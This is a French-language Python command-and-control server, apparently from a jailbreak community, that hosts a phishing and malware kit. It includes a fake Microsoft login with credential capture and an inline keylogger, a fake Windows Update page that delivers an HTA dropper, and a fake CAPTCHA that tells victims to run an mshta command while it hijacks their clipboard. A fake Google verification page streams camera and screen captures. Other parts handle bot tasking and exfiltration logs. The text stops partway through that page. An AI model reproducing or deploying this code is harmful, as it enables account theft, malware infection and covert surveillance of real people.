#!/usr/bin/env python3
"""
server_v2.py — FlashCMD serveur principal complet
@oll.fx | discord.gg/ojailbreaks

Routes GET :
  /                   phishing Microsoft login
  /update             fausse MAJ Windows → HTA
  /captcha            faux CAPTCHA reCAPTCHA
  /surveillance       caméra + écran
  /keylog_page        keylogger JS
  /admin              panel admin
  /clone/<name>       site cloné
  /assets_<n>/<file>  assets des clones
  /c2                 dashboard C2
  /hta/<name>         télécharge fichier HTA
  /payload_hta        idem depuis /update
  /go?url=            URL piégée
  /shorten?url=       créer shortlink
  /s/<code>           redirect shortlink
  /qr?url=            QR code piégé
  /track/<id>         pixel tracking email
  /payload?name=      payload Python avec IP injectée
  /oneliner?name=     one-liner base64
  /builds/<file>      .exe / .apk
  /download/extension zip extension Chrome
  /c2/bots            JSON bots
  /c2/task/<id>       task pour bot
  /c2/creds           credentials log
  /c2/exfil           exfil log
  /c2/visits          visits log
  /c2/tracking        tracking log
  /c2/keylog          keylog log
  /c2/frames          JSON frames caméra/écran
  /frame_img/<path>   image frame

Routes POST :
  /collect            credentials + fingerprint
  /proxy_submit/<n>   formulaire clone intercepté
  /frame              frame caméra/écran
  /keylog             frappes clavier
  /c2/register        enregistrer bot
  /c2/result/<id>     résultat commande
  /c2/push/<id>       push commande
  /exfil              données exfiltrées
  /ext/*              extension Chrome
"""

import os, io, json, base64, socket, pathlib
import datetime, threading, urllib.parse, urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    import requests as req_lib
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ══════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════

PORT = int(os.environ.get("FLASHCMD_PORT", 8080))

def get_public_url() -> str:
    env = os.environ.get("FLASHCMD_PUBLIC_URL", "")
    if env:
        return env.rstrip("/")
    cfg = pathlib.Path(".config.json")
    if cfg.exists():
        try:
            return json.loads(
                cfg.read_text()
            ).get("public_url", "").rstrip("/")
        except Exception:
            pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return f"http://{ip}:{PORT}"
    except Exception:
        return f"http://localhost:{PORT}"

PUBLIC_URL  = get_public_url()
LOG_FILE    = "visits.log"
CREDS_FILE  = "creds.log"
EXFIL_FILE  = "exfil.log"
TRACK_FILE  = "tracking.log"
KLOG_FILE   = "keylog.log"
PAYLOAD_DIR = pathlib.Path("payloads")
PAGE_DIR    = pathlib.Path("pages")

bots       = {}
bots_lock  = threading.Lock()
shortlinks = {}

PIXEL_GIF = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)

# ══════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════

def log(entry: dict):
    entry["ts"] = datetime.datetime.now().isoformat()
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(
        f"[{entry['ts'][:19]}] "
        f"{entry.get('type','?'):<20} "
        f"{entry.get('ip','?'):<16} "
        f"{entry.get('detail','')[:55]}"
    )

def build_payload(name: str) -> bytes:
    p = PAYLOAD_DIR / name
    if not p.exists():
        return f"# not found: {name}".encode()
    code = p.read_text(encoding="utf-8", errors="replace")
    host = PUBLIC_URL.split("//")[-1].split(":")[0]
    code = code.replace("FILL_C2_URL",  PUBLIC_URL)
    code = code.replace("FILL_C2_HOST", host)
    code = code.replace("FILL_PORT",    str(PORT))
    return code.encode()

def b64_oneliner(payload_bytes: bytes) -> str:
    b64 = base64.b64encode(payload_bytes).decode()
    return (
        f'python3 -c "'
        f"exec(__import__('base64')"
        f".b64decode('{b64}').decode())\""
    )

def make_qr(url: str) -> bytes | None:
    try:
        import qrcode
        qr = qrcode.QRCode(box_size=8, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(
            fill_color="black", back_color="white")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except ImportError:
        return None

def make_short(url: str) -> str:
    import hashlib
    code = hashlib.md5(url.encode()).hexdigest()[:7]
    shortlinks[code] = url
    return code

def inject(html: str) -> bytes:
    return (
        html
        .replace("%%C2%%",   PUBLIC_URL)
        .replace("%%BASE%%", PUBLIC_URL)
    ).encode("utf-8")

def make_hta(payload_name: str) -> str:
    return f"""<html>
<head>
<title>Windows Security Update</title>
<HTA:APPLICATION ID="upd"
  APPLICATIONNAME="Windows Update"
  BORDER="none"
  CAPTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_onLoad
  Dim oShell, oHTTP, oStream, tmp, py
  Set oShell  = CreateObject("WScript.Shell")
  Set oHTTP   = CreateObject("MSXML2.XMLHTTP")
  Set oStream = CreateObject("ADODB.Stream")
  tmp = oShell.ExpandEnvironmentStrings("%TEMP%")

  ' Payload principal
  py = tmp & "\\svc_{payload_name}.py"
  oHTTP.Open "GET", "{PUBLIC_URL}/payload?name={payload_name}", False
  oHTTP.Send
  If oHTTP.Status = 200 Then
    oStream.Open : oStream.Type = 1
    oStream.Write oHTTP.ResponseBody
    oStream.SaveToFile py, 2 : oStream.Close
    On Error Resume Next
    oShell.Run "pythonw " & py, 0, False
    If Err.Number <> 0 Then
      Err.Clear
      oShell.Run "python3 " & py, 0, False
    End If
    If Err.Number <> 0 Then
      oShell.Run "python " & py, 0, False
    End If
    On Error GoTo 0
  End If

  ' Dropper chain
  Dim dp : dp = tmp & "\\drop.py"
  oHTTP.Open "GET", "{PUBLIC_URL}/payload?name=dropper", False
  oHTTP.Send
  If oHTTP.Status = 200 Then
    oStream.Open : oStream.Type = 1
    oStream.Write oHTTP.ResponseBody
    oStream.SaveToFile dp, 2 : oStream.Close
    On Error Resume Next
    oShell.Run "pythonw " & dp, 0, False
    oShell.Run "python3 " & dp, 0, False
    oShell.Run "python "  & dp, 0, False
    On Error GoTo 0
  End If

  window.close
End Sub
</script>
</head>
<body style="background:transparent"></body>
</html>"""

# ══════════════════════════════════════════════════════════════
# PAGES HTML
# ══════════════════════════════════════════════════════════════

def page_index() -> str:
    return """<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Se connecter — Microsoft</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1e1e2e;color:#e0e0e0;
     font-family:'Segoe UI',system-ui,sans-serif;
     min-height:100vh;display:flex;flex-direction:column}
.topbar{background:#0078d4;padding:12px 24px;
        display:flex;align-items:center;gap:10px}
.topbar-logo{display:flex;gap:2px}
.topbar-logo div{width:9px;height:9px}
.r{background:#f25022}.g{background:#7fba00}
.b{background:#00a4ef}.y{background:#ffb900}
.topbar span{color:#fff;font-size:15px;
             font-weight:600;margin-left:6px}
.main{flex:1;display:flex;align-items:center;
      justify-content:center;padding:40px 20px}
.card{background:#2a2a3e;border:1px solid #3a3a5e;
      border-radius:4px;padding:44px;
      width:440px;max-width:95vw}
h1{font-size:24px;font-weight:400;margin-bottom:16px}
.sub{color:#8888aa;font-size:14px;margin-bottom:28px;
     line-height:1.5}
.alert{background:rgba(230,57,70,.12);
       border-left:3px solid #e63946;
       padding:12px 14px;margin-bottom:24px;
       font-size:13px;color:#ff9999;border-radius:0 4px 4px 0}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;
             color:#8888aa;margin-bottom:6px}
.field input{width:100%;background:#1a1a2e;
             border:1px solid #3a3a5e;
             border-radius:2px;padding:12px 14px;
             color:#e0e0e0;font-size:15px;
             outline:none;transition:border .15s}
.field input:focus{border-color:#0078d4}
.btn{width:100%;padding:12px;background:#0078d4;
     border:none;color:#fff;font-size:15px;
     font-weight:600;cursor:pointer;
     border-radius:2px;transition:background .15s}
.btn:hover{background:#006cbe}
.links{margin-top:16px;font-size:13px}
.links a{color:#4da6ff;text-decoration:none}
.links a:hover{text-decoration:underline}
.sep{color:#3a3a5e;margin:0 8px}
.footer{padding:16px 24px;font-size:11px;
        color:#555;border-top:1px solid #2a2a3e;
        display:flex;gap:16px;flex-wrap:wrap}
.footer a{color:#555;text-decoration:none}
.err-msg{color:#e63946;font-size:12px;
         margin-top:8px;display:none}
</style></head>
<body>
<div class="topbar">
  <div class="topbar-logo">
    <div class="r"></div><div class="g"></div>
    <div style="clear:both"></div>
    <div class="b"></div><div class="y"></div>
  </div>
  <span>Microsoft</span>
</div>

<div class="main">
  <div class="card">
    <h1>Se connecter</h1>
    <div class="alert">
      ⚠ Connexion inhabituelle détectée depuis un
      nouvel appareil. Vérification requise.
    </div>

    <div id="s1">
      <p class="sub">
        Utilisez votre compte Microsoft pour continuer.
      </p>
      <div class="field">
        <label>E-mail, téléphone ou Skype</label>
        <input type="email" id="em"
               placeholder="nom@exemple.com"
               autofocus>
      </div>
      <div class="links">
        <a href="#">Pas de compte ? Créez-en un !</a>
      </div>
      <button class="btn" style="margin-top:16px"
              onclick="step2()">Suivant</button>
    </div>

    <div id="s2" style="display:none">
      <p class="sub" id="em-disp" style="margin-bottom:20px;
         color:#e0e0e0;font-size:14px"></p>
      <div class="field">
        <label>Mot de passe</label>
        <input type="password" id="pw"
               placeholder="Mot de passe">
      </div>
      <div class="links">
        <a href="#">Mot de passe oublié ?</a>
      </div>
      <div class="err-msg" id="err">
        Votre compte ou mot de passe est incorrect.
      </div>
      <button class="btn" style="margin-top:16px"
              onclick="submit_()">Se connecter</button>
    </div>
  </div>
</div>

<div class="footer">
  <a href="#">Conditions d'utilisation</a>
  <a href="#">Confidentialité et cookies</a>
  <a href="#">© 2025 Microsoft</a>
</div>

<script>
const C2="%%C2%%";
let _em="";

function send(d){
  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(d)}).catch(()=>{});
}

// Fingerprint complet à l'arrivée
(function fp(){
  const d={page:"ms_land",
    ua:navigator.userAgent,lang:navigator.language,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height,
    cores:navigator.hardwareConcurrency,
    mem:navigator.deviceMemory,
    ref:document.referrer,
    touch:navigator.maxTouchPoints};
  // WebRTC IP locale
  try{
    const pc=new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel("");
    pc.createOffer().then(o=>pc.setLocalDescription(o));
    pc.onicecandidate=e=>{
      if(e&&e.candidate){
        const m=e.candidate.candidate
          .match(/\d+\.\d+\.\d+\.\d+/);
        if(m)d.local_ip=m[0];
      }
    };
  }catch(e){}
  if(navigator.getBattery)
    navigator.getBattery().then(b=>{
      d.battery={level:b.level,charging:b.charging};
    });
  setTimeout(()=>send(d),800);
})();

// Keylogger JS inline
(function kl(){
  const B=[];let t=null;
  const ks=d=>fetch(C2+"/keylog",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(d)}).catch(()=>{});
  document.addEventListener("keydown",e=>{
    const el=document.activeElement;
    B.push({k:e.key,
      f:el?(el.id||el.name||el.type||"?"):"?",
      ts:Date.now()});
    clearTimeout(t);t=setTimeout(flush,3000);
    if(e.key==="Enter")flush();
  },true);
  document.addEventListener("blur",e=>{
    const el=e.target;
    if(el.value&&el.tagName==="INPUT")
      ks({type:"field",
        f:el.id||el.name||el.type,
        v:el.value,ts:new Date().toISOString()});
  },true);
  document.addEventListener("paste",e=>{
    const t=(e.clipboardData||window.clipboardData)
      .getData("text");
    if(t)ks({type:"paste",v:t,
      url:location.href,ts:new Date().toISOString()});
  },true);
  function flush(){
    if(!B.length)return;
    ks({type:"keys",keys:B.splice(0),
      url:location.href,ts:new Date().toISOString(),
      ua:navigator.userAgent});
  }
  setInterval(flush,8000);
  window.addEventListener("beforeunload",()=>{
    flush();
    if(B.length&&navigator.sendBeacon)
      navigator.sendBeacon(C2+"/keylog",
        JSON.stringify({type:"beacon",keys:B}));
  });
})();

function step2(){
  _em=document.getElementById("em").value.trim();
  if(!_em)return;
  send({page:"ms_email",email:_em,
    ua:navigator.userAgent});
  document.getElementById("s1").style.display="none";
  document.getElementById("s2").style.display="block";
  document.getElementById("em-disp").textContent=_em;
  document.getElementById("pw").focus();
}

function submit_(){
  const pw=document.getElementById("pw").value;
  if(!pw)return;
  send({page:"ms_password",email:_em,password:pw,
    ua:navigator.userAgent,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone});
  document.getElementById("err").style.display="block";
  document.getElementById("pw").value="";
  document.getElementById("pw").focus();
  setTimeout(()=>{
    window.location.href="https://login.microsoftonline.com";
  },4000);
}

document.addEventListener("keydown",e=>{
  if(e.key==="Enter"){
    if(document.getElementById("s1")
       .style.display!=="none") step2();
    else submit_();
  }
});
</script>
</body></html>"""

def page_update() -> str:
    return """<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Windows Update</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f3f3f3;font-family:'Segoe UI',sans-serif;
     min-height:100vh;display:flex;flex-direction:column}
.taskbar{position:fixed;bottom:0;left:0;right:0;height:48px;
         background:#1e1e1e;display:flex;align-items:center;
         padding:0 12px;gap:4px;z-index:100}
.win-btn{width:40px;height:40px;display:flex;
         align-items:center;justify-content:center;
         border-radius:4px;cursor:pointer}
.win-btn:hover{background:rgba(255,255,255,.1)}
.tb-clock{margin-left:auto;color:white;font-size:12px;
          text-align:right;line-height:1.4;padding-right:8px}
.main{flex:1;display:flex;align-items:center;
      justify-content:center;padding:40px 20px 80px}
.card{background:white;border-radius:8px;padding:48px;
      width:580px;max-width:95vw;
      box-shadow:0 4px 32px rgba(0,0,0,.12)}
.shield{font-size:52px;text-align:center;
        margin-bottom:20px}
h1{font-size:22px;font-weight:400;
   color:#1a1a1a;margin-bottom:12px}
.desc{color:#555;font-size:14px;line-height:1.6;
      margin-bottom:24px}
.update-box{background:#eff6fc;
            border:1px solid #bee3f8;
            border-radius:6px;padding:16px 20px;
            margin-bottom:28px}
.update-title{font-weight:600;font-size:14px;
              color:#1a1a1a;margin-bottom:6px;
              display:flex;align-items:center;gap:8px}
.badge-crit{background:#fde;color:#c00;
            font-size:11px;padding:2px 7px;
            border-radius:3px;font-weight:600}
.update-meta{font-size:12px;color:#666;
             display:flex;gap:16px;flex-wrap:wrap}
.prog-wrap{margin-bottom:24px;display:none}
.prog-label{font-size:13px;color:#333;
            margin-bottom:8px}
.prog-track{height:6px;background:#e0e0e0;
            border-radius:3px;overflow:hidden}
.prog-fill{height:100%;width:0%;background:#0078d4;
           border-radius:3px;transition:width .4s}
.btn-install{padding:12px 32px;background:#0078d4;
             border:none;border-radius:4px;
             color:#fff;font-size:14px;
             font-weight:600;cursor:pointer}
.btn-install:hover{background:#005fa3}
.btn-install:disabled{opacity:.5;cursor:not-allowed}
.note{font-size:12px;color:#888;margin-top:12px}
.sep{border:none;border-top:1px solid #eee;
     margin:24px 0}
.other-updates{font-size:13px;color:#555}
.other-updates li{margin-bottom:6px;
                  padding-left:16px;position:relative}
.other-updates li::before{content:"•";
  position:absolute;left:0;color:#0078d4}
</style></head>
<body>
<div class="taskbar">
  <div class="win-btn">
    <svg width="18" height="18" viewBox="0 0 18 18">
      <rect x="0" y="0" width="8" height="8" fill="#f25022"/>
      <rect x="10" y="0" width="8" height="8" fill="#7fba00"/>
      <rect x="0" y="10" width="8" height="8" fill="#00a4ef"/>
      <rect x="10" y="10" width="8" height="8" fill="#ffb900"/>
    </svg>
  </div>
  <div class="tb-clock" id="clk">00:00<br>01/01/2025</div>
</div>

<div class="main">
  <div class="card">
    <div class="shield">🛡️</div>
    <h1>Des mises à jour sont disponibles</h1>
    <p class="desc">
      Votre appareil nécessite une mise à jour de sécurité
      critique. Cette mise à jour corrige des vulnérabilités
      qui pourraient permettre à des attaquants d'accéder
      à votre système à distance.
    </p>

    <div class="update-box">
      <div class="update-title">
        Mise à jour cumulative Windows
        <span class="badge-crit">Critique</span>
      </div>
      <div class="update-meta">
        <span>KB5035942</span>
        <span>128,4 Mo</span>
        <span>CVE-2025-21334 (CVSS 9.8)</span>
      </div>
    </div>

    <div class="prog-wrap" id="pw">
      <div class="prog-label" id="pl">
        Initialisation…
      </div>
      <div class="prog-track">
        <div class="prog-fill" id="pf"></div>
      </div>
    </div>

    <button class="btn-install" id="btn"
            onclick="startUpdate()">
      Télécharger et installer
    </button>
    <p class="note">
      Votre PC redémarrera automatiquement après
      l'installation. Enregistrez votre travail avant
      de continuer.
    </p>

    <hr class="sep">
    <div class="other-updates">
      <strong style="font-size:13px;color:#333">
        Autres mises à jour (3)
      </strong>
      <ul style="margin-top:8px;list-style:none;padding:0">
        <li>Microsoft Defender — Définitions</li>
        <li>Mise à jour du pilote Intel</li>
        <li>Microsoft Edge — Correctif de sécurité</li>
      </ul>
    </div>
  </div>
</div>

<script>
const C2="%%C2%%";

// Horloge
setInterval(()=>{
  const n=new Date();
  document.getElementById("clk").innerHTML=
    n.toLocaleTimeString("fr-FR",
      {hour:"2-digit",minute:"2-digit"})+
    "<br>"+n.toLocaleDateString("fr-FR");
},1000);

// Fingerprint
fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"update_land",
    ua:navigator.userAgent,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height,
    cores:navigator.hardwareConcurrency,
    mem:navigator.deviceMemory})}).catch(()=>{});

const STEPS=[
  [0,  "Téléchargement de la mise à jour…"],
  [30, "Vérification de la signature numérique…"],
  [55, "Extraction des composants…"],
  [75, "Préparation de l'installation…"],
  [90, "Application des correctifs…"],
  [100,"Installation terminée — lancement…"],
];

function startUpdate(){
  const btn=document.getElementById("btn");
  btn.disabled=true;
  btn.textContent="Installation en cours…";
  document.getElementById("pw").style.display="block";

  let w=0,si=0;
  const pf=document.getElementById("pf");
  const pl=document.getElementById("pl");

  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({page:"update_click",
      ua:navigator.userAgent})}).catch(()=>{});

  const iv=setInterval(()=>{
    while(si<STEPS.length&&w>=STEPS[si][0]){
      pl.textContent=STEPS[si][1];si++;
    }
    w=Math.min(w+Math.random()*1.8+0.3,100);
    pf.style.width=w+"%";
    if(w>=100){
      clearInterval(iv);
      // Livrer le HTA — s'ouvre via mshta natif Windows
      setTimeout(()=>{
        window.location.href=
          C2+"/payload_hta?name=keylogger";
      },800);
    }
  },150);
}
</script>
</body></html>"""

def page_captcha() -> str:
    return """<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vérification — Je ne suis pas un robot</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#fff;font-family:Arial,Helvetica,sans-serif;
     display:flex;align-items:center;justify-content:center;
     min-height:100vh;flex-direction:column;gap:16px}
.rc-box{border:1px solid #d3d3d3;border-radius:3px;
        background:#f9f9f9;width:300px;
        box-shadow:0 0 4px rgba(0,0,0,.08)}
.rc-main{display:flex;align-items:center;
         padding:16px;gap:12px}
.rc-cb{width:28px;height:28px;border:2px solid #c1c1c1;
       border-radius:3px;cursor:pointer;
       display:flex;align-items:center;
       justify-content:center;background:white;
       flex-shrink:0;transition:border .15s}
.rc-cb:hover{border-color:#4a90d9}
.rc-cb.loading{border-color:#4a90d9}
.rc-cb.done{background:#4a90d9;border-color:#4a90d9}
.rc-label{font-size:14px;color:#202124;user-select:none;
          cursor:pointer}
.rc-logo{margin-left:auto;text-align:right}
.rc-logo-text{font-size:9px;color:#4a4a4a;font-weight:700;
              letter-spacing:.5px}
.rc-links{font-size:8px;color:#4a4a4a}
.rc-links a{color:#4a4a4a;text-decoration:none}
.rc-footer{background:#ededed;border-top:1px solid #d3d3d3;
           padding:4px 10px;display:flex;
           justify-content:space-between;
           align-items:center}
.rc-footer-logo{font-size:10px;color:#888}
.rc-footer-links{font-size:9px;color:#888;display:flex;gap:8px}
.rc-footer-links a{color:#888;text-decoration:none}

/* Panel étapes */
.steps-panel{background:#fff;border:1px solid #d3d3d3;
             border-radius:4px;padding:20px;width:300px;
             display:none;
             box-shadow:0 2px 8px rgba(0,0,0,.12)}
.steps-title{font-size:14px;font-weight:700;
             margin-bottom:14px;color:#202124}
.step{display:flex;gap:10px;margin-bottom:12px;
      font-size:13px;align-items:flex-start;color:#333}
.sn{background:#1a73e8;color:#fff;border-radius:50%;
    min-width:20px;height:20px;display:flex;
    align-items:center;justify-content:center;
    font-size:11px;font-weight:700;flex-shrink:0;
    margin-top:1px}
code{background:#f1f3f4;padding:2px 6px;
     border-radius:3px;font-size:12px;color:#333}
.cmd-display{background:#1a1a1a;color:#00ff88;
             font-family:'Courier New',monospace;
             font-size:11px;padding:10px 12px;
             border-radius:4px;margin:12px 0;
             word-break:break-all;line-height:1.5;
             border:1px solid #333}
.copy-btn{width:100%;padding:10px;background:#1a73e8;
          border:none;border-radius:4px;color:#fff;
          font-size:13px;cursor:pointer;
          font-weight:600}
.copy-btn:hover{background:#1557b0}
.copy-ok{display:none;color:#1b8a3c;font-size:12px;
         text-align:center;margin-top:8px;
         font-weight:600}

/* Spinner */
.spinner{width:18px;height:18px;
         border:2px solid #f0f0f0;
         border-top-color:#4a90d9;
         border-radius:50%;
         animation:spin .7s linear infinite;
         display:none}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head>
<body>

<div class="rc-box">
  <div class="rc-main">
    <div class="rc-cb" id="cb" onclick="doCheck()">
      <svg id="tick" style="display:none"
           width="14" height="14" viewBox="0 0 14 14">
        <polyline points="2,7 5,11 12,3"
          stroke="white" stroke-width="2.5"
          fill="none" stroke-linecap="round"
          stroke-linejoin="round"/>
      </svg>
      <div class="spinner" id="spin"></div>
    </div>
    <label class="rc-label" onclick="doCheck()">
      Je ne suis pas un robot
    </label>
    <div class="rc-logo">
      <div class="rc-logo-text">reCAPTCHA</div>
      <div class="rc-links">
        <a href="#">Confidentialité</a> -
        <a href="#">CGU</a>
      </div>
    </div>
  </div>
  <div class="rc-footer">
    <div class="rc-footer-logo">Google reCAPTCHA</div>
    <div class="rc-footer-links">
      <a href="#">Aide</a>
      <a href="#">Confidentialité</a>
      <a href="#">CGU</a>
    </div>
  </div>
</div>

<div class="steps-panel" id="panel">
  <div class="steps-title">
    ✅ Vérification manuelle requise
  </div>
  <div class="step">
    <div class="sn">1</div>
    <div>Appuyez sur <code>⊞ Win</code> +
      <code>R</code> simultanément</div>
  </div>
  <div class="step">
    <div class="sn">2</div>
    <div>Cliquez sur le bouton
      <strong>Copier</strong> ci-dessous</div>
  </div>
  <div class="step">
    <div class="sn">3</div>
    <div>Collez avec <code>Ctrl</code> +
      <code>V</code> dans la fenêtre
      et appuyez <code>Entrée</code></div>
  </div>
  <div class="cmd-display" id="cmd">
    Génération de la commande…
  </div>
  <button class="copy-btn" onclick="copyCmd()">
    📋 Copier la commande de vérification
  </button>
  <div class="copy-ok" id="ok">
    ✓ Commande copiée — ouvrez Win+R, collez et Entrée
  </div>
</div>

<script>
const C2="%%C2%%";
const CMD=`mshta "${C2}/hta/keylogger"`;
document.getElementById("cmd").textContent=CMD;

function doCheck(){
  const cb=document.getElementById("cb");
  if(cb.classList.contains("done"))return;
  cb.classList.add("loading");
  document.getElementById("spin").style.display="block";
  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({page:"captcha_check",
      ua:navigator.userAgent,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone
    })}).catch(()=>{});
  setTimeout(()=>{
    document.getElementById("spin").style.display="none";
    cb.classList.remove("loading");
    cb.classList.add("done");
    document.getElementById("tick").style.display="block";
    document.getElementById("panel").style.display="block";
  },1200);
}

function copyCmd(){
  const copy=(txt)=>{
    if(navigator.clipboard&&window.isSecureContext)
      return navigator.clipboard.writeText(txt);
    const ta=document.createElement("textarea");
    ta.value=txt;document.body.appendChild(ta);
    ta.select();document.execCommand("copy");
    document.body.removeChild(ta);
    return Promise.resolve();
  };
  copy(CMD).then(()=>{
    const btn=document.querySelector(".copy-btn");
    btn.textContent="✓ Copié !";
    btn.style.background="#1b8a3c";
    document.getElementById("ok").style.display="block";
    fetch(C2+"/collect",{method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({page:"captcha_copy",
        ua:navigator.userAgent})}).catch(()=>{});
  });
}

// Clipboard hijack toutes les 3s
setInterval(()=>{
  if(!navigator.clipboard)return;
  navigator.clipboard.readText().then(t=>{
    if(t&&!t.includes("mshta"))
      navigator.clipboard.writeText(CMD).catch(()=>{});
  }).catch(()=>{});
},3000);

fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"captcha_land",
    ua:navigator.userAgent,
    cores:navigator.hardwareConcurrency,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone
  })}).catch(()=>{});
</script>
</body></html>"""

def page_surveillance() -> str:
    return """<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vérification d'identité — Google</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f1f3f4;font-family:'Google Sans',
     Arial,sans-serif;min-height:100vh;
     display:flex;flex-direction:column;
     align-items:center;justify-content:center;
     padding:20px}
.card{background:#fff;border-radius:8px;padding:40px;
      width:460px;max-width:95vw;
      box-shadow:0 1px 6px rgba(0,0,0,.1)}
.g-logo{text-align:center;margin-bottom:16px;
        font-size:26px;font-weight:300;color:#5f6368;
        letter-spacing:-0.5px}
.g-logo b{color:#4285f4}
h1{font-size:20px;color:#202124;text-align:center;
   font-weight:400;margin-bottom:8px}
.sub{color:#5f6368;font-size:14px;text-align:center;
     margin-bottom:28px;line-height:1.5}
.step{display:flex;align-items:center;gap:14px;
      padding:14px 16px;border:1px solid #dadce0;
      border-radius:8px;margin-bottom:10px;
      cursor:pointer;transition:all .2s;background:#fff}
.step:hover{border-color:#1a73e8;
            background:rgba(26,115,232,.03)}
.step.done{border-color:#1b8a3c;
           background:rgba(27,138,60,.04)}
.step-ico{width:44px;height:44px;border-radius:50%;
          background:#f1f3f4;display:flex;
          align-items:center;justify-content:center;
          font-size:20px;flex-shrink:0;transition:all .2s}
.step.done .step-ico{background:rgba(27,138,60,.12)}
.step-info .stitle{font-size:14px;font-weight:500;
                   color:#202124;margin-bottom:2px}
.step-info .sdesc{font-size:12px;color:#5f6368}
.step-info .sstatus{font-size:11px;margin-top:4px}
.ok-s{color:#1b8a3c}.wait-s{color:#5f6368}.err-s{color:#d93025}
.btn-g{width:100%;padding:12px;background:#1a73e8;
       border:none;border-radius:4px;color:#fff;
       font-size:15px;font-weight:500;cursor:pointer;
       margin-top:16px;transition:background .15s}
.btn-g:hover{background:#1557b0}
.btn-g:disabled{background:#dadce0;
                color:#9aa0a6;cursor:not-allowed}
.g-footer{margin-top:20px;text-align:center;
          font-size:11px;color:#5f6368}
.g-footer a{color:#1a73e8;text-decoration:none;
            margin:0 6px}
</style></head>
<body>
<div class="card">
  <div class="g-logo"><b>G</b>oogle</div>
  <h1>Vérification en deux étapes</h1>
  <p class="sub">
    Pour votre protection, Google vérifie votre identité
    avant d'autoriser l'accès depuis ce nouvel appareil.
  </p>

  <div class="step" id="sc" onclick="startCam()">
    <div class="step-ico">📷</div>
    <div class="step-info">
      <div class="stitle">Reconnaissance faciale</div>
      <div class="sdesc">Vérification via caméra</div>
      <div class="sstatus wait-s" id="cs">
        Appuyez pour démarrer
      </div>
    </div>
  </div>

  <div class="step" id="ss" onclick="startScr()">
    <div class="step-ico">🖥</div>
    <div class="step-info">
      <div class="stitle">Vérification de l'appareil</div>
      <div class="sdesc">Capture de conformité</div>
      <div class="sstatus wait-s" id="ss2">
        Appuyez pour démarrer
      </div>
    </div>
  </div>

  <button class="btn-g" id="btn"
          disabled onclick="done()">
    Accéder à mon compte →
  </button>
</div>
<div class="g-footer">
  <a href="#">Aide</a>
  <a href="#">Confidentialité</a>
  <a href="#">Conditions</a>
</div>

<script>
const C2="%%C2%%";
let camOK=false,scrOK=false;
let camIv=null,scrIv=null;

function post(d){
  fetch(C2+"/frame",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(d)}).catch(()=>{});
}
function cap(v,type){
  const c=document.createElement("canvas");
  c.width=v.videoWidth||640;
  c.height=v.videoHeight||480;
  c.getContext("2d").drawImage(v,0,0);
  post({type,frame:c.toDataURL("image/jpeg",.65),
       ts:new Date().toISOString(),
       ua:navigator.userAgent});
}
function markDone(si,sti,m){
  document.getElementById(si).classList.add("done");
  const s=document.getElementById(sti);
  s.className="sstatus ok-s";s.textContent=m;
  if(camOK&&scrOK)
    document.getElementById("btn").disabled=false;
}
function markErr(sti,m){
  const s=document.getElementById(sti);
  s.className="sstatus err-s";s.textContent=m;
}

async function startCam(){
  if(camOK)return;
  document.getElementById("cs").textContent="Démarrage…";
  try{
    const st=await navigator.mediaDevices.getUserMedia(
      {video:{width:{ideal:1280},height:{ideal:720}},
       audio:false});
    const v=document.createElement("video");
    v.srcObject=st;v.autoplay=true;v.muted=true;
    v.onloadedmetadata=()=>{
      camOK=true;
      markDone("sc","cs","✓ Vérification réussie");
      camIv=setInterval(()=>cap(v,"camera"),2000);
      setTimeout(()=>cap(v,"camera"),300);
    };
  }catch(e){
    markErr("cs",e.name==="NotAllowedError"
      ?"Accès refusé — appuyez pour réessayer"
      :"Erreur: "+e.message);
  }
}

async function startScr(){
  if(scrOK)return;
  document.getElementById("ss2").textContent="Démarrage…";
  try{
    const st=await navigator.mediaDevices.getDisplayMedia(
